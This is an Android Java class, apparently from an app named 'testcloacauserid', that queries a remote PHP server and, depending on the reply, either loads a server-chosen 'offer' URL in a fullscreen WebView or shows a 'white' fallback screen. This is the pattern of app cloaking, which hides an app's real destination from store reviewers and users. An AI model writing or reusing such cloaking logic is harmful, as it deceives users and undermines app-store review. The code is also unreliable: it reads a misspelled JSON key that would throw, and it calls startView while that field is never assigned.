package com.example.testcloacauserid;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class Web {
    private StartView startView;
    private Activity activity;
    private Settings settings;




    public Web(Activity activity) {
        this.activity = (Activity) activity;
    }

    public void start(){
        activity.requestWindowFeature(Window.FEATURE_NO_TITLE);
        activity.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        activity.setContentView(R.layout.loading);
        sendRequest();
    }

    public void back(){
        try {
            ((WebView) activity.findViewById(R.id.webView)).goBack();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }






    void sendRequest(){
        Thread thread = new Thread(() -> {
            try {
                String proxy = "co78977.tmweb.ru/do.php";
                String APP_ID = "1126";
                String METRICA_ID = "12321352673-4573246537485";
                StringBuilder urlBuilder = new StringBuilder("http://");
                urlBuilder.append(proxy);
                urlBuilder.append("?");
                urlBuilder.append("hif=");
                urlBuilder.append(APP_ID);
                urlBuilder.append("&appmetrika=").append(METRICA_ID);


                System.out.println(urlBuilder);

                URL url = new URL(urlBuilder.toString());
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");

                BufferedReader br = new BufferedReader(new InputStreamReader((conn.getInputStream())));
                StringBuilder sb = new StringBuilder();
                String output;
                while ((output = br.readLine()) != null) {
                    sb.append(output);
                }

                JSONObject response = new JSONObject(sb.toString());

                System.out.println(response);
               // settings = new Settings(activity,"https://www.google.ru");//тестовая ссылка нужно будет подставить оффер с json
               // activity.runOnUiThread(() -> settings.webSetings());
                ///Переписать парсер
                if (response.getBoolean("success")) {
                    Log.e("Succsess","--> " + response.getBoolean("succes"));

                    String offerUrl = response.getJSONObject("data").getString("offer");
                    settings = new Settings(activity,offerUrl);
                    activity.runOnUiThread(() -> settings.webSetings());
                }else{
                    activity.runOnUiThread(() -> startView.runWhite());
                }
                conn.disconnect();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        thread.start();

    }



}
